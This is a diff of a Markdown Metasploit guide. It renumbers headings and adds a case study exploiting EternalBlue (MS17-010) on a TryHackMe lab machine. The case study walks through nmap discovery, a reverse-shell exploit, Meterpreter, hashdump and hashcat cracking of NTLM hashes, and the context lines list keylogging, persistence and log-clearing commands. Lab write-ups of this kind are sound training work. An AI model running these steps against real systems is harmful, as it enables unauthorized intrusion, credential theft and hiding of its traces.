@@ -3,7 +3,7 @@ The Metasploit Framework is a vital tool in cybersecurity, used for penetration 
 
 # 2. Installation
 
-### Unix / macOS:
+### 2.1 Unix / macOS:
 
 #### Automatic Installation (Linux / macOS):
 To automatically install Metasploit on Linux or macOS systems, use the following script invocation:
@@ -19,7 +19,7 @@ To automatically install Metasploit on Linux or macOS systems, use the following
 #### Manual Installation for macOS:
 - The latest macOS installer package can be downloaded directly here: https://osx.metasploit.com/metasploitframework-latest.pkg, with the last 8 builds archived at https://osx.metasploit.com/. Simply download and launch the installer to install Metasploit Framework with all of its dependencies.
 
-### Windows:
+### 2.2 Windows:
 
 #### Manual Installation:
 - Download the latest Windows installer or view older builds here: https://windows.metasploit.com/. To install, download the .msi package, adjust your Antivirus as-needed to ignore c:\metasploit-framework, and execute the installer by right-clicking the installer file and selecting “Run as Administrator”. The msfconsole command and all related tools will be added to the system %PATH% environment variable.
@@ -50,7 +50,7 @@ Invoke-WebRequest -UseBasicParsing -Uri $DownloadURL -OutFile $Installer
 
 & $Installer /q /log $LogLocation INSTALLLOCATION="$InstallLocation"
 ```
-### Supported Operating Systems & Requirements:
+### 2.3 Supported Operating Systems & Requirements:
 
 - **Unix-based systems (Linux, macOS)**
   - **Operating System:** 
@@ -75,7 +75,7 @@ Invoke-WebRequest -UseBasicParsing -Uri $DownloadURL -OutFile $Installer
     - Minimum of 1 GB disk space for installation.
   - **Additional Requirements:** 
     - Internet access for automatic updates and package downloads. Windows Installer 3.1 or later.
-### Installing Updates:
+### 2.4 Installing Updates:
 - Unix Systems:
   ```bash
   sudo apt-get update
@@ -288,10 +288,10 @@ collecting information, dumping credentials, or establishing persistence on the 
 - `set SESSION 1`
 - `run`
 
-# Meterpreter
+### 5. Meterpreter
 Meterpreter, an integral component of the Metasploit Framework, serves as a pivotal post-exploitation tool widely utilized by penetration testers and ethical hackers. Its inception within the open-source framework enables security professionals to discover, exploit, and validate vulnerabilities across diverse systems and networks. At its core, Meterpreter facilitates interactive shell sessions on compromised target systems, affording operators comprehensive control over various system facets.
 
-### Key Features and Functionalities:
+#### 5.1 Key Features and Functionalities:
 
 - **Platform Independence:** Meterpreter boasts platform independence, functioning seamlessly across Windows, Linux, and macOS environments, ensuring compatibility across a spectrum of target systems.
 - **Payload Delivery:** Often employed as a payload post-exploit, Meterpreter injects into system memory, evading detection by bypassing disk storage, thus enhancing its stealth capabilities.
@@ -303,7 +303,7 @@ Meterpreter, an integral component of the Metasploit Framework, serves as a pivo
 - **Screenshot Capture:** Security professionals utilize Meterpreter to capture screenshots of target system desktops, aiding in the observation of victim activities.
 - **Persistence:** Meterpreter establishes persistence on compromised systems, ensuring sustained access even post-system reboots.
 
-### Basic Meterpreter Commands:
+#### 5.2 Basic Meterpreter Commands:
 
 - `help`: Lists available Meterpreter commands.
 - `sysinfo`: Retrieves system information.
@@ -320,7 +320,7 @@ Meterpreter, an integral component of the Metasploit Framework, serves as a pivo
 - `keyscan_start` and `keyscan_dump`: Initiates and dumps keylogging data.
 - `screenshot`: Captures target desktop screenshot.
 
-### Advanced Meterpreter Features:
+#### 5.3 Advanced Meterpreter Features:
 
 - `migrate`: Moves session to another process for stealth.
 - `portfwd`: Sets up port forwarding for traffic pivoting.
@@ -328,7 +328,7 @@ Meterpreter, an integral component of the Metasploit Framework, serves as a pivo
 - `timestomp`: Manipulates file timestamps for cover-up.
 - `clearev`: Clears event logs on target system.
 
-### Persistence and Privilege Escalation:
+#### 5.4 Persistence and Privilege Escalation:
 
 - `run persistence`: Establishes persistent backdoor for continued access.
 - `getuid`: Displays current user's privileges.
@@ -336,7 +336,140 @@ Meterpreter, an integral component of the Metasploit Framework, serves as a pivo
 - `rev2self`: Attempts to revert to original token.
 - `use incognito`: Activates incognito mode for token manipulation.
 
-### Cleaning Up:
+#### 5.5 Cleaning Up:
 
 - `clearev`: Clears event logs on target system.
 - `execute -f cmd.exe -i -H`: Spawns new command prompt with high integrity level.
+
+# 6. Case Studies
+
+### 6.1 EternalBlue
+
+In this section, we will explore a real-world scenario involving the complete utilization of Metasploit. For this case study, I used a vulnerable machine obtained from the TryHackMe platform. This machine is vulnerable to EternalBlue (CVE-2017-0143). We will conduct a penetration testing process on this machine using Metasploit to demonstrate its effectiveness in identifying and exploiting vulnerabilities.
+
+This case study aims to provide a comprehensive view of how Metasploit can be applied in practical scenarios, showcasing its capabilities and utility in a controlled, educational environment. By following this example, security professionals can gain insights into the steps and methodologies involved in a typical penetration testing process.
+
+#### 6.1.1 Initial Setup
+
+The initial phase of the penetration process involves network scanning to identify all active IP addresses within our network. This reconnaissance phase is crucial as it provides a foundational understanding of the network's layout and the potential targets available for further assessment and exploitation.
+
+First, let's turn on the database and open the Metasploit Framework using the following command:
+
+```bash
+sudo msfdb init && msfconsole
+```
+
+#### 6.1.2 Network Discovery
+
+For this step, we need to identify our network IP address with its subnet to perform network scanning. We will use Nmap, a network scanning tool integrated into Metasploit, to discover devices on our network.
+
+Execute the following command with the `-sn` option to scan the network range:
+
+```bash
+nmap -sn 10.10.254.0/24
+```
+
+The initial scan returned numerous IP addresses, making it impractical to check each one manually. To refine our search, we can add arguments to Nmap to specifically look for IPs with open SMB ports (445 or 139). By using the `-p 445,139` option along with `--open`, we can focus only on the hosts with these ports open.
+
+![Screenshot from 2024-06-27 16-56-21](https://github.com/mchklt/PFE/assets/53612008/4db0c22f-0405-4e0d-a6e6-5e6fbcfe7c9d)
+
+
+Now, we need to identify only the hosts vulnerable to EternalBlue (CVE-2017-0143). By adding the `--script smb-vuln-ms17-010.nse` option to our Nmap command, we can achieve this. This script specifically checks for the MS17-010 vulnerability, allowing us to pinpoint the vulnerable systems.
+
+![Screenshot from 2024-06-27 17-01-24](https://github.com/mchklt/PFE/assets/53612008/61ae5d38-9039-481d-96ae-bf821ef189ba)
+
+That's it! We have identified `10.10.254.86` as the vulnerable host. Now, in Metasploit, we can search for an exploit targeting this vulnerability using the following command:
+
+```bash
+search ms17_010 type:exploit
+```
+
+![Screenshot from 2024-06-27 17-03-37](https://github.com/mchklt/PFE/assets/53612008/237cd8e4-f82b-4e52-a85b-509dc87777b7)
+
+#### 6.1.3 Exploitation
+
+Let's move to the first module by using the following command:
+
+```bash
+use exploit/windows/smb/ms17_010_eternalblue
+```
+
+or simply:
+
+```bash
+use 0
+```
+
+We are now in the module that can exploit the ms17_010 vulnerability on our target host `10.10.254.86`.
+
+![Screenshot from 2024-06-27 17-06-18](https://github.com/mchklt/PFE/assets/53612008/bb690507-b0ed-4094-a6be-2d1ecc231f93)
+
+By typing `show options`, we can view the variables that need to be set for the exploit.
+
+![Screenshot from 2024-06-27 17-08-48](https://github.com/mchklt/PFE/assets/53612008/08e2d4c7-d0cf-4f9f-acc5-c7ea6dfd0913)
+
+The important variables for us are `RHOST`, `RPORT`, `LHOST`, and `LPORT`:
+
+- **RHOST**: This variable specifies the IP address of the target host that we intend to exploit. In our case, it's `10.10.254.86`. To set it, use `set RHOSTS 10.10.254.86`.
+
+- **RPORT**: This variable specifies the port number on the target host where the vulnerable service is running. For the EternalBlue exploit, it's typically `445` (SMB port). To set it, use `set RPORT 445`.
+
+- **LHOST**: This variable specifies the IP address of our attacking machine, where we want to receive the reverse shell or establish communication. It should be set to our own IP address. For example, `set LHOST 10.4.83.48`.
+
+- **LPORT**: This variable specifies the port on our attacking machine that will be used for communication with the vulnerable host. It's chosen by us to receive the reverse shell or other communication. For instance, `set LPORT 9090`.
+
+By typing `exploit`, we initiate the attack against the vulnerable host.
+
+![Screenshot from 2024-06-27 17-22-19](https://github.com/mchklt/PFE/assets/53612008/d9b06a18-f498-4730-9a34-b5104915d27b)
+
+That's it, we've successfully gained access to the vulnerable machine.
+
+![Screenshot from 2024-06-27 18-03-31](https://github.com/mchklt/PFE/assets/53612008/8d8f4f23-f895-4474-ac97-26321b1486fd)
+
+#### 6.1.4 Post-Exploitation
+
+Now, to keep our session running in the background, we'll type `CTRL + Z`, then confirm with `y`.
+
+![Screenshot from 2024-06-27 18-12-05](https://github.com/mchklt/PFE/assets/53612008/d68b03b2-899a-46b4-850d-9e81b646a30d)
+
+Let's switch from the regular shell to Meterpreter to explore further by using `session -u 1`.
+
+![Screenshot from 2024-06-27 18-43-41](https://github.com/mchklt/PFE/assets/53612008/7b3822f7-5611-466c-a1c9-7e48a80b5e15)
+
+Done, now that our Meterpreter session has been added to the sessions, you can view all active sessions by typing `sessions`, and to enter session 2, type `session 2`.
+
+![Screenshot from 2024-06-27 18-45-02](https://github.com/mchklt/PFE/assets/53612008/774c84f6-a788-45d5-940a-6e0085f47a1b)
+
+#### 6.1.5 Privilege Escalation
+
+After executing `hashdump` to dump secret hashes, here are the results:
+
+![Screenshot from 2024-06-27 19-12-02](https://github.com/mchklt/PFE/assets/53612008/e3e13be1-25f3-4b62-a69b-ccfa38455aee)
+
+To crack the hashed password using Hashcat, follow these steps. First, redirect the NTLM hash to a file named `hash.txt`:
+
+```bash
+echo "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" > hash.txt
+```
+
+Next, use Hashcat with the specified format and a wordlist (e.g., `/usr/share/wordlists/rockyou.txt`) to crack the hash:
+
+```bash
+hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+This command attempts to crack the NTLM hash using words from the `rockyou.txt` wordlist.
+
+![Screenshot from 2024-06-27 19-56-39](https://github.com/mchklt/PFE/assets/53612008/25038958-717c-486e-9d39-ca35b9eb157d)
+
+To display the cracked passwords in plain text using Hashcat, use the following command:
+
+```bash
+hashcat --show hash.txt
+```
+
+![Screenshot from 2024-06-27 19-56-45](https://github.com/mchklt/PFE/assets/53612008/e5a78e75-55a5-4d3e-a05d-591f7f100bf7)
+
+Now that we have the users' passwords, we can proceed to the next phase of penetration testing: lateral movement.
